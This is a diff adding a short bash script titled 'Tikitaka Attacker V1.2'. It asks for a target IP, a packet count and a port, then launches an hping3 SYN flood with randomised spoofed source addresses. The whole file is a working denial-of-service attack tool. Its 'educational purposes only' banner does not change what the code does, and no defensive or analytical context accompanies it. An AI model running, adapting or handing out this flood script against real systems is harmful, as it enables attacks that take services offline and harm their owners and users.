@@ -1,0 +1,28 @@
+#!/bin/bash
+
+echo
+echo " ------------------------------------------------------------------------------"
+echo "|                                                                              |"
+echo "|   Tikitaka Attacker V1.2, Khalifa Alahmedi 2025                              |"
+echo "|   ONLY use for educational purposes. I am NOT responsible for any misuse.    |"
+echo "|                                                                              |"
+echo " ------------------------------------------------------------------------------" 
+echo
+read -p "[tikitaka] IP address: " ip
+read -p "[tikitaka] Amount of packets: " pac
+read -p "[tikitaka] Port: " port
+
+if [[ "$ip" == "" ]]; then
+	echo "[tikitaka] ERROR: IP not specified, cannot proceed"
+else
+	if [[ "$pac" == "" ]]; then
+		echo "[tikitaka] ERROR: Packet amount not specified, cannot proceed"
+	else
+		if [[ "$port" == "" ]]; then
+			echo "[tikitaka] WARNING: Port not specified, using default"
+			sudo hping3 -c $pac -d 64 -S --flood --rand-source $ip
+		else
+			sudo hping3 -c $pac -d 64 -S -p $port --flood --rand-source $ip
+		fi
+	fi
+fi
